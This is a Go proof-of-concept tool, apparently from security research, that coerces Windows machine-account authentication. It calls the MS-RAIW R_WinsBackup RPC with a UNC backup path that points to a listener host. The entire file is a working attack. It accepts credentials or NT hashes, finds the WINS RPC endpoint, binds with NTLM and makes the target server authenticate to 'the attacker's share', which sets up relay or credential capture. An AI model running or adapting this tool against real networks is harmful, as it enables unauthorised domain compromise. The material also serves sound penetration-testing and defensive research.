// File name          : coerce_poc.go
// Author             : Podalirius (@podalirius_)
// Date created       : 12 Sep 2026
//
// Proof of concept for coercing authentication with MS-RAIW::R_WinsBackup()
// (opnum 44 of the dhcpsrv2 interface), written with the TheManticoreProject libraries.
//
// R_WinsBackup backs up the WINS database to a caller-specified directory (with
// "\wins_bak\" appended). Per [MS-RAIW] 3.1.4.7 there is no UNC validation; a UNC
// pBackupPath makes the WINS server (the machine account) write there, coercing
// authentication. NOTE the marshalling trap: pBackupPath is LPBYTE (an ANSI byte string,
// ndr.STR), NOT a Unicode LPWSTR. The RAIW interface is reached over ncacn_ip_tcp.
//
//	go run coerce_poc.go --target 192.168.1.30 --listener 192.168.1.10 -d LAB.local -u user -p 'password'
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
	winsiface "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/45f52c28-7f9f-101a-b52b-08002b2efabe/1.0"
	winsfn "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/45f52c28-7f9f-101a-b52b-08002b2efabe/1.0/functions"
	eptiface "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/e1af8308-5d1f-11c9-91a4-08002b14a0fa/3.0"
	eptfn "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/e1af8308-5d1f-11c9-91a4-08002b14a0fa/3.0/functions"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/v5/pdu"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/v5/transport/tcp"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	"github.com/TheManticoreProject/goopts/parser"
	"golang.org/x/term"
)

var (
	debug        bool
	target       string
	listener     string
	shareName    string
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string
	authNoPass   bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{Banner: "Windows auth coerce using MS-RAIW::R_WinsBackup() - by Remi GASCOU (Podalirius) - v1.0.0"}
	ap.SetOptShowBannerOnHelp(true)
	ap.SetOptShowBannerOnRun(true)
	ap.NewBoolArgument(&debug, "", "--debug", false, "Enable debug mode.")
	if g, err := ap.NewArgumentGroup("Network"); err == nil {
		g.NewStringArgument(&target, "-t", "--target", "", true, "IP address or hostname of the target WINS server.")
	}
	if g, err := ap.NewArgumentGroup("Coercion"); err == nil {
		g.NewStringArgument(&listener, "-l", "--listener", "", true, "IP address or hostname of the listener the target should authenticate to.")
		g.NewStringArgument(&shareName, "", "--share", "share", false, "Share component of the UNC backup path.")
	}
	if g, err := ap.NewArgumentGroup("Authentication"); err == nil {
		g.NewStringArgument(&authDomain, "-d", "--domain", "", false, "(FQDN) domain to authenticate to.")
		g.NewStringArgument(&authUsername, "-u", "--user", "", false, "User to authenticate as.")
	}
	if g, err := ap.NewNotRequiredMutuallyExclusiveArgumentGroup("Secret"); err == nil {
		g.NewBoolArgument(&authNoPass, "", "--no-pass", false, "Don't ask for a password (null session).")
		g.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		g.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
	}
	ap.Parse()
}

func promptPassword() (string, error) {
	fmt.Print("Password: ")
	secret, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	return string(secret), err
}

func main() {
	parseArgs()
	if debug {
		logger.SetLevel(logger.LevelDebug)
	}
	if authUsername != "" && authPassword == "" && authHashes == "" && !authNoPass {
		p, err := promptPassword()
		if err != nil {
			logger.Errorf("Error reading password: %s", err)
			return
		}
		authPassword = p
	}
	creds, err := credentials.NewCredentials(authDomain, authUsername, authPassword, authHashes)
	if err != nil {
		logger.Errorf("Error creating credentials: %s", err)
		return
	}

	// The DHCP RPC interfaces are ncacn_ip_tcp only; resolve the dynamic port from the
	// endpoint mapper on TCP/135.
	logger.Infof("Resolving the RAIW/WINS endpoint on %s via the endpoint mapper ...", target)
	ept := dcerpcclient.NewClient(tcp.New(target, tcp.EndpointMapperPort))
	if err := ept.Bind(eptiface.SyntaxID()); err != nil {
		logger.Errorf("Error binding the endpoint mapper: %s", err)
		return
	}
	s := winsiface.SyntaxID()
	eps, err := eptfn.Map(ept, s.UUID, s.MajorVersion, s.MinorVersion)
	ept.Close()
	if err != nil || len(eps) == 0 {
		logger.Errorf("Error resolving the RAIW endpoint (is the WINS feature installed?): %v", err)
		return
	}
	logger.Infof("RAIW/WINS is on ncacn_ip_tcp:%s[%d]", target, eps[0].Port)

	rpc := dcerpcclient.NewClient(tcp.New(target, int(eps[0].Port)))
	if err := rpc.SetAuth(pdu.AuthTypeNTLMSSP, pdu.AuthLevelPktPrivacy, creds); err != nil {
		logger.Errorf("Error configuring RPC authentication: %s", err)
		return
	}
	logger.Infof("Binding to <%s> ...", s.UUID.ToFormatD())
	if err := rpc.Bind(s); err != nil {
		logger.Errorf("Error binding dhcpsrv2: %s", err)
		return
	}
	logger.Info("Bind successful")
	defer rpc.Close()
	logger.Infof("Authenticated as [%s]", strings.Trim(authDomain+"\\"+authUsername, "\\"))

	// The coerced argument: a UNC directory. The server appends "\wins_bak\" and writes
	// the backup there; no UNC validation ([MS-RAIW] 3.1.4.7). pBackupPath is LPBYTE, so it
	// MUST be an ANSI string (ndr.STR), not a Unicode LPWSTR.
	path := ndr.STR(fmt.Sprintf(`\\%s\%s`, listener, shareName))
	logger.Infof("Calling R_WinsBackup(pBackupPath='%s' [ANSI], fIncremental=0) ...", string(path))
	if err := winsfn.R_WinsBackup(rpc, path, 0); err != nil {
		// ERROR_FULL_BACKUP / other status is expected: the machine account cannot create
		// the backup files on the attacker's share, but it has already authenticated to it.
		logger.Infof("R_WinsBackup() returned: %s", err)
		logger.Info("The call was processed by the target, check your listener.")
		return
	}
	logger.Info("R_WinsBackup() returned success, check your listener.")
}
